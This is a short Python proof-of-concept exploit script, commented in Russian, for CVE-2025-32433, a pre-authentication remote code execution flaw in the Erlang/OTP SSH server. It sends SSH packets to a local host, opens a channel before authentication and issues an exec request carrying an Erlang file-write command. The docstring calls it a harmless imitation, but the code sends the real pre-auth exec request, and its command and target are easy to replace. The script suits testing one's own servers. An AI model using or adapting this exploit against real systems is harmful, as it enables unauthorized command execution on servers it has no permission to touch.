#!/usr/bin/env python3
"""
Минимальный PoC для CVE-2025-32433
Имитация pre-auth RCE в Erlang/OTP SSH
Имитация взаимодействия без активации уязвимости
"""

import socket
import struct

# Конфигурация цели (локальный сервер)
HOST = "127.0.0.1"
PORT = 2222

def build_ssh_packet(payload):
    """Формирует минимальный SSH-пакет (длина + мини-заголовок + payload)"""
    return struct.pack(">I", len(payload) + 5) + b"\x05" + payload + b"\x00"*8

print(f"[*] Имитация эксплуатации CVE-2025-32433 против {HOST}:{PORT}")

try:
    # Установка TCP-соединения
    with socket.create_connection((HOST, PORT), timeout=3) as sock:
        
        # Этап 1: Обмен SSH-баннерами
        print("[*] Этап 1: Отправка SSH-баннера")
        sock.send(b"SSH-2.0-PoC_CVE-2025-32433\r\n")
        banner = sock.recv(256)
        print(f"[+] Получен баннер: {banner.strip().decode(errors='ignore')}")
        
        # Этап 2: KEXINIT (имитация handshake)
        print("[*] Этап 2: Отправка SSH_MSG_KEXINIT")
        kex = b"\x14" + b"\x00"*16
        sock.send(build_ssh_packet(kex))
        print("[+] KEXINIT отправлен")
        
        # Этап 3: CHANNEL_OPEN (ключевой момент - отправка до аутентификации!)
        print("[*] Этап 3: Отправка SSH_MSG_CHANNEL_OPEN (pre-auth!)")
        chan = b"\x5a" + struct.pack(">I", 7) + b"session" + struct.pack(">III", 0, 0x8000, 0x4000)
        sock.send(build_ssh_packet(chan))
        print("[+] CHANNEL_OPEN отправлен БЕЗ аутентификации")
        
        # Этап 4: CHANNEL_REQUEST (имитация выполнения команды)
        print("[*] Этап 4: Отправка SSH_MSG_CHANNEL_REQUEST с тестовой командой")
        cmd = b'file:write_file("/tmp/cve-2025-32433.txt", <<"PoC">>).'
        req = b"\x62" + struct.pack(">I", 0) + struct.pack(">I", 4) + b"exec" + b"\x01" + struct.pack(">I", len(cmd)) + cmd
        sock.send(build_ssh_packet(req))
        print("[+] CHANNEL_REQUEST с командой отправлен")
        
        # Итог
        print("\n[✓] ИМИТАЦИЯ АТАКИ ЗАВЕРШЕНА")
        print("[!] Сервер уязвим, если он принял CHANNEL_REQUEST до аутентификации")
        print("[i] Для реального пентеста требуется проверка наличия файла /tmp/cve-2025-32433.txt")

except ConnectionRefusedError:
    print("[-] Ошибка: соединение отклонено (сервер недоступен или не уязвим)")
except Exception as e:
    print(f"[-] Ошибка при имитации: {type(e).__name__}: {e}")
